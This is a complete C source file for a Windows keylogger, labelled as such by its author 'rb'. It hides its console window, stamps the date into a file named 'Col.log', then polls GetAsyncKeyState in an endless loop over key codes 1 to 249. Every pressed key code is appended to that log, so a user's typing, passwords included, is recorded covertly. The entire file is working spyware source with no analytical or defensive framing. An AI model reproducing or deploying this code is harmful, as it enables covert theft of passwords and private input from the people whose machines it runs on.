/*
Create by rb
:Keylogger program
*/

#include <stdio.h>
#include <windows.h>
#include <time.h>

#define LOG_NAME "Col.log"

int main()
{
    //hiding console window
    FreeConsole();
    //open - create file (a)->append
    FILE* file = fopen(LOG_NAME, "a");

//Generate date time into file and format
    time_t date = time(NULL);
    fprintf(file, "0\n%s\t", ctime(&date));
    fclose(file);

    unsigned short ch, i;
    while(1)
    {
        ch = 1;
        //Main-purpose: Search for character
        //This case just spilt five block(250/50)
        while(ch < 250) // scanning for ascii char  (250?)
        {
            for(i=0; i<50; i++,ch++)
            {
                if(GetAsyncKeyState(ch) == -32767)//?
                {
                    file = fopen(LOG_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            //calm down for processor increasing higher
            Sleep(1);
        }
    }
}